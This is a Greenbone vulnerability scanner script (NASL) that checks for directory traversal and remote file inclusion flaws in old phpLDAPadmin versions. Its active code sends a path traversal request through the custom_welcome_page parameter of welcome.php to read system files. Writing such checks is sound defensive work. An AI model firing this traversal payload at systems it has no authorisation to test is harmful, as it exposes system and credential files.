# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:phpldapadmin_project:phpldapadmin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.117012");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2020-11-05 14:47:54 +0000 (Thu, 05 Nov 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2005-2792", "CVE-2005-2793");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("phpLDAPadmin 0.9.6 - 0.9.7/alpha5 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_phpldapadmin_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpldapadmin/http/detected");

  script_tag(name:"summary", value:"phpLDAPadmin is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2005-2792: Directory traversal vulnerability in welcome.php allows remote attackers to read
  arbitrary files via a .. (dot dot) in the custom_welcome_page parameter

  - CVE-2005-2793: PHP remote file inclusion vulnerability in welcome.php allows remote attackers
  to execute arbitrary PHP code via the custom_welcome_page parameter");

  script_tag(name:"affected", value:"phpLDAPadmin versions 0.9.6 through 0.9.7/alpha5 are known to
  be affected. Older versions might be affected as well.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://marc.info/?l=bugtraq&m=112542447219235&w=2");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/14695");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = dir + "/welcome.php?custom_welcome_page=" + crap(length:3*8, data:"../") + file;
  req = http_get(port:port, item:url);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(!res)
    continue;

  if(egrep(pattern:pattern, string:res)) {
    report = "It was possible to obtain the file " + file + " via the url " +
             http_report_vuln_url(port:port, url:url, url_only:TRUE) + '\n\nResult:\n\n' + res;
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
